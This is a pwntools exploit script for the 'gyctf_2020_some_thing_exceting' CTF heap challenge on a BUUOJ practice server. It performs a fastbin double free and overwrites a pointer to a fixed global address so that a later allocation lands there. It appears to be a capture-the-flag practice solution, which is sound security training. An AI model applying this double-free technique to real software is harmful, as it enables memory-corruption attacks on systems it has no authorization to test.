#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/20 14:28:51
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 1
if debug:
    sh = process("gyctf_2020_some_thing_exceting")
else:
    sh = remote("node3.buuoj.cn",28558)
elf = ELF("gyctf_2020_some_thing_exceting")
# libc = ELF()
def cmd(choice):
    sh.recvuntil("> Now please tell me what you want to do :")
    sh.sendline(str(choice))
def add(ba_size,ba,na_size,na):
    cmd(1)
    sh.recvuntil("ba's length : ")
    sh.sendline(str(ba_size))
    sh.recvuntil("ba : ")
    sh.send(ba)
    sh.recvuntil("na's length : ")
    sh.sendline(str(na_size))
    sh.recvuntil("na : ")
    sh.send(na)

def dele(index):
    cmd(3)
    sh.recvuntil("> Banana ID : ")
    sh.sendline(str(index))

def leak(index):
    cmd(4)
    sh.recvuntil("> Banana ID : > SCP project ID : ")
    sh.sendline(str(index))

add(0x58,"\n",0x58,"\n")

add(0x58,"\n",0x58,"\n")



dele(0)

dele(1)

dele(0)

add(0x58,p64(0x602098),0x58,"\n")

add(0x58,"\n",0x58,"\n")

add(0x38,"\n",0x58,"\n")

sh.interactive()
    